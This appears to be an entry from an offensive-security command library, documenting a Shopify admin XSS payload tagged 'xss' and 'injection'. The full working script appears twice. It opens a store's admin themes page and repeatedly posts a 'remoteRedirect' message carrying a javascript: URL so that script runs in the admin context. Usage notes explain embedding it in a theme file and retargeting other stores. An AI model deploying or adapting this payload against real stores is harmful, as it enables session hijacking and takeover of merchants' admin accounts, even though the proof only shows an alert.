---
data: >-
  <script>

  function attack(){

  var ctx=window.open('https://cuxuri.myshopify.com/admin/themes');

  var interval;

  interval=setInterval(function(){

  if(window.attackSuccess){

  clearInterval(interval);

  }else{

  ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);

  }

  },500);;

  }

  </script>

  <a href="javascript:attack()"
  style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click
  me start attack</a>
tags:
  - xss
  - injection
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.183Z'
id: 3ab083a8-2295-4c0d-ad4e-35027e26a402
verified: false
validated: true
submitted: true
---
# inject-shopify-xss-payload

## Command

```javascript
<script>
function attack(){
var ctx=window.open('https://cuxuri.myshopify.com/admin/themes');
var interval;
interval=setInterval(function(){
if(window.attackSuccess){
clearInterval(interval);
}else{
ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
}
},500);;
}
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Description

This JavaScript command injects a clickable payload into a webpage that opens the Shopify admin themes page and sends repeated postMessages to exploit the remoteRedirect vulnerability, executing a javascript:alert in the admin context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ctx | Window reference to admin/themes | Yes |
| interval | setInterval ID for polling | Yes |
| postMessage payload | JSON with message and location | Yes |

## Examples

### Basic Usage

Embed in HTML/liquid file and click the link to trigger.

### Advanced Usage

Modify domain in window.open for different stores.

## Expected Output

New window opens, postMessage sent every 500ms until alert(document.domain) executes in admin.

## Related

- [[commands/inject-auto-shopify-xss-payload]]
- [[procedures/Craft-Malicious-XSS-Payload]]
